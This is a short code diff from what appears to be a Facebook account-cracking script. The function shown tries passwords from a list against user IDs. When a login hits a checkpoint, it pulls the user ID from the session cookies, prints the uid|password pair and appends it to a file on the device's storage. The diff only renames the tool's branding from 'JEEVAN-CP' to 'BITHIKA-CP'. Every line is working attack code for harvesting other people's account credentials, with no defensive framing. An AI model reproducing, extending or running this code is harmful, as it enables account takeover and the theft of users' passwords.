@@ -1361,8 +1361,8 @@ def rndm4(uid,passlist):
                                         coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                                         coki1 = coki.split("1000")[1]
                                         uid = "1000"+coki1[0:11]
-                                        print(f'\r\r{G}[{Y}JEEVAN-CP{G}]{Y} '+uid+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/JEEVAN-CP.txt','a').write(uid+'|'+pas+'\n')
+                                        print(f'\r\r{G}[{Y}BITHIKA-CP{G}]{Y} '+uid+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/BITHIKA-CP.txt','a').write(uid+'|'+pas+'\n')
                                         cps.append(uid)
                                         return True
                                
